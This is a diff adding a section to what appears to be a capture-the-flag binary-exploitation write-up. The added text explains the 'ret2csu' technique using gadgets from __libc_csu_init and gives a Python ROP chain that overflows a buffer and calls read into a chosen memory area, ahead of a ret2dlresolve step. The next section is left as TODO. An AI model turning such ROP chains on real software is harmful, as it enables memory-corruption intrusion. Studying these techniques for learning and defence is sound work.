@@ -132,5 +132,67 @@ considered this as unecessary work, so I used a different approach `ret2csu`.
 ___
 # Second Attempt, ret2csu
 
-TODO
+Instead of simply calling `read` via a `ROPchain` I used the `ret2csu` method
+to avoid loosing track of the `ROPchain`.
 
+All the gadgets needed can be found in the `__libc_csu_init` function. On a
+program startup this function calls all functions from the `.init_array`
+segment. These are functions like constructors or initialization of global
+variables and so on, like everything which has to be ready before the `main`
+function is called.
+
+The part of the function we need is:
+
+```
+.text:0000000000400560 4C 89 FA        mov     rdx, r15
+.text:0000000000400563 4C 89 F6        mov     rsi, r14
+.text:0000000000400566 44 89 EF        mov     edi, r13d
+.text:0000000000400569 41 FF 14 DC     call    [r12+rbx*8]
+.text:000000000040056D 48 83 C3 01     add     rbx, 1
+.text:0000000000400571 48 39 DD        cmp     rbp, rbx
+.text:0000000000400574 75 EA           jnz     short loc_400560
+.text:0000000000400576 48 83 C4 08     add     rsp, 8
+.text:000000000040057A 5B              pop     rbx
+.text:000000000040057B 5D              pop     rbp
+.text:000000000040057C 41 5C           pop     r12
+.text:000000000040057E 41 5D           pop     r13
+.text:0000000000400580 41 5E           pop     r14
+.text:0000000000400582 41 5F           pop     r15
+.text:0000000000400584 C3              retn
+```
+
+But we Split it into two gadgets, the first starting at `0x400560` which
+contains the function call, and the second one starts at `0x40057A`, this one
+we use to correctly setup the arguments needed for the call at `0x400569`.
+
+As we see there is no `leave` instructions, so nothing messes with the rsp,
+except the `add rsp, 8` but we can overcome this easy with padding.
+
+The `ROPchain` we will use is:
+```Python
+C_AREA     = 0x601030
+CSU_RET    = 0x40057A
+CSU_CALL   = 0x400560
+RELOC_READ = 0x601018
+
+chain_read  = b"A"*80                   # overflow padding
+chain_read += b"B"*8                    # fake rbp
+chain_read += p64(CSU_RET)              # gadget
+chain_read += p64(0)                    # RBX (to get "call [r12]")
+chain_read += p64(1)                    # RBP (to pass cmp rbp, rbx after call)
+chain_read += p64(RELOC_READ)           # R12 (overwrite read GOT entry)
+chain_read += p64(0)                    # R13 (has to be zero for stdin read)
+chain_read += p64(C_AREA)               # R14 (ptr to controlable buffer)
+chain_read += p64(0x100)                # R15 (amount we want to read)
+chain_read += p64(CSU_CALL)
+chain_read += b"D"*8                    # to counter (add rsp,8) after call
+```
+
+This will call `read` and we can pass our forged structs to it. After the 
+read we continue and call the resolver.
+<br/>
+
+___
+# Createing the Structs
+
+TODO
